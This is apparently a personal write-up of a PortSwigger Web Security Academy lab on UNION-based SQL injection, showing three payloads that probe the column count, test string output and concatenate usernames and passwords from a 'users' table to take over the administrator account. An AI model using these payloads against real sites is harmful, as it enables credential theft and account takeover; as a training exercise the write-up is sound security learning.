\# SQL Injection — UNION Attack, Retrieving Multiple Values in a Single Column



Platform: PortSwigger Web Security Academy

Difficulty: Practitioner

Status: Solved



\---



**## Objective**



Retrieve both usernames and passwords

from the `users` table using only one

column and log in as `administrator`.



\---



\## What I Found



The category filter was vulnerable to

UNION-based SQL injection. But this time

only one column could display string data.

So I couldn't retrieve username and

password as separate columns like before.



\---



\## **What I Did**



Confirmed 2 columns exist:



```sql

' UNION SELECT NULL,NULL--

```



Tested which column accepts strings:



```sql

' UNION SELECT NULL,'abc'--

```



Only second column returned text.



Combined both values into one column:



```sql

' UNION SELECT NULL, username || '\~' || password FROM users--

```



Output on page:



```

**administrator\~s3cur3p4ssw0rd**

```



Split at `\~` to separate username

and password. Logged in as

`administrator` 



\---



\## Why It Worked



PostgreSQL uses `||` to join strings.

By merging username and password into

one string with a `\~` separator, I

bypassed the one-column limitation.

`--` removed the rest of the

original query.



\---



\## Impact



\- Full credentials exposed

\- Front-end column limit bypassed

\- Admin account compromised



\---



\## Reference



\[PortSwigger SQLi UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

